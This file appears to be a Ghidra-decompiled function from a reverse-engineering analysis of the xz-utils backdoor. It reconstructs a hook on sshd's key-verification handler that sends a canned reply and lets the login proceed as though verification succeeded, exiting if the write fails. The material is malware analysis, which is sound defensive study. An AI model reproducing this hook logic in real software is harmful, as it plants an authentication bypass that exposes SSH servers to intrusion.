// /home/kali/xzre-ghidra/xzregh/108080_mm_answer_keyverify_hook.c
// Function: mm_answer_keyverify_hook @ 0x108080
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyverify_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Pulls the canned monitor reply out of the global payload context and writes it straight to the requesting socket via
 * `fd_write()`. If the write succeeds it restores the original mm_answer_keyverify pointer so sshd's dispatcher advances
 * as if verification succeeded; if it fails the hook invokes libc's `exit()` to avoid leaving sshd mid-patch. Either way
 * it never consults sshd's own logic, short-circuiting the verification phase entirely.
 */

#include "xzre_types.h"

int mm_answer_keyverify_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *funcs;
  long lVar1;
  ssize_t sVar2;
  sshd_payload_ctx_t *payload_ctx;
  libc_imports_t *libc_imports;
  
  if (global_ctx == 0) {
    return 0;
  }
  funcs = *(libc_imports_t **)(global_ctx + 0x10);
  if ((funcs != (libc_imports_t *)0x0) && (lVar1 = *(long *)(global_ctx + 0x20), lVar1 != 0)) {
    if ((*(ushort *)(lVar1 + 0x84) != 0) &&
       ((*(void **)(lVar1 + 0x88) != (void *)0x0 &&
        (sVar2 = fd_write(sock,*(void **)(lVar1 + 0x88),(ulong)*(ushort *)(lVar1 + 0x84),funcs),
        -1 < sVar2)))) {
      **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd8);
      return 1;
    }
    if (funcs->exit != (pfn_exit_t)0x0) {
      (*funcs->exit)(0);
    }
  }
  return 0;
}

